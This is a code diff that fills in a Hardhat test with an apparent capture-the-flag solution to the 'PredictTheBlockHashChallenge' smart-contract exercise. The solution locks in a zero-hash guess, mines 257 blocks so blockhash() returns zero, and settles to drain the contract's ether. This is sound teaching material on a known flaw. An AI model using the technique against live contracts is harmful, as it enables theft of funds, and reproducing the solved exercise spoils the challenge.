@@ -1,33 +1,36 @@
-import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
 import { expect } from 'chai';
-import { Contract } from 'ethers';
 import { ethers } from 'hardhat';
+import { Contract } from 'ethers';
 const { utils } = ethers;
 
-describe('PredictTheBlockHashChallenge', () => {
-  let deployer: SignerWithAddress;
-  let attacker: SignerWithAddress;
-  let target: Contract;
+describe('PredictTheBlockHashChallenge', function () {
+  let challengeContract: Contract;
 
-  before(async () => {
-    [attacker, deployer] = await ethers.getSigners();
-
-    target = await (
-      await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer)
-    ).deploy({
-      value: utils.parseEther('1'),
-    });
-
-    await target.deployed();
-
-    target = target.connect(attacker);
+  before(async function () {
+    const challengeFactory = await ethers.getContractFactory('PredictTheBlockHashChallenge');
+    challengeContract = await challengeFactory.deploy({ value: utils.parseEther('1') });
+    await challengeContract.deployed();
   });
 
-  it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+  it('Solves the challenge', async function () {
+    // Lock in the zero hash guess
+    const lockInGuessTx = await challengeContract.lockInGuess(
+      '0x0000000000000000000000000000000000000000000000000000000000000000',
+      { value: utils.parseEther('1') }
+    );
+    await lockInGuessTx.wait();
 
-    expect(await target.isComplete()).to.equal(true);
+    // Mine 257 blocks to ensure that the blockhash function will return zero
+    // We wait for 257 blocks because we need to be past the 256 block threshold
+    for (let i = 0; i < 257; i++) {
+      await ethers.provider.send('evm_mine', []);
+    }
+
+    // Settle the challenge
+    const attackTx = await challengeContract.settle();
+    await attackTx.wait();
+
+    // Check if the challenge is complete
+    expect(await challengeContract.isComplete()).to.be.true;
   });
 });
